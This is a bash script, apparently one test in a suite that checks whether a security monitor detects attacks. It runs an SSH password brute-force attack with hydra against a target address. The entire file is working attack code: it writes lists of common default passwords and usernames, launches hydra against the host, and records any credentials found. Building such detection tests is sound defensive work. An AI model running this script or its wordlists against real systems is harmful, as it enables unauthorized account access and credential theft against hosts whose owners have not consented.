#!/usr/bin/env bash
# =============================================================================
# 03 — Brute Force: SSH Password Attack
# Tool: hydra
# SSS should detect: brute_force pattern (repeated failed SSH connections)
# =============================================================================
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
attack_start "03_brute_ssh"

# Create a small wordlist (enough to trigger detection but not take forever)
WORDLIST="/tmp/ssh_passwords.txt"
cat > "${WORDLIST}" <<'EOF'
password
123456
admin
root
toor
letmein
sentinel
admin123
password123
changeme
qwerty
test
guest
oracle
mysql
postgres
sysadmin
P@ssw0rd
Welcome1
Summer2024
EOF

USERLIST="/tmp/ssh_users.txt"
cat > "${USERLIST}" <<'EOF'
root
admin
sentinel
ubuntu
user
test
operator
guest
EOF

echo "[*] Running SSH brute force against ${TARGET_IP}:${SSH_PORT:-22}..."
hydra_output=$(timeout "${ATTACK_TIMEOUT}" \
    hydra -L "${USERLIST}" -P "${WORDLIST}" \
    -t 4 -f -V \
    "ssh://${TARGET_IP}:${SSH_PORT:-22}" 2>&1) || true

# Check if any credentials were found
creds_found=$(echo "${hydra_output}" | grep -c "\[22\]\[ssh\]" || true)

if [[ "${creds_found}" -gt 0 ]]; then
    found_line=$(echo "${hydra_output}" | grep "\[22\]\[ssh\]" | head -1)
    evidence="SSH credentials found: ${found_line}"
    record_result "true" "${evidence}" "${hydra_output}"
else
    # Check if it was blocked vs just no valid creds
    blocked=$(echo "${hydra_output}" | grep -ciE "connection refused|timeout|blocked|reset" || true)
    if [[ "${blocked}" -gt 0 ]]; then
        evidence="SSH brute force was blocked/connection refused."
        record_result "false" "${evidence}" "${hydra_output}"
    else
        evidence="No valid credentials found (attack ran but failed to authenticate)."
        record_result "true" "${evidence}" "${hydra_output}"
    fi
fi

# Clean up
rm -f "${WORDLIST}" "${USERLIST}"
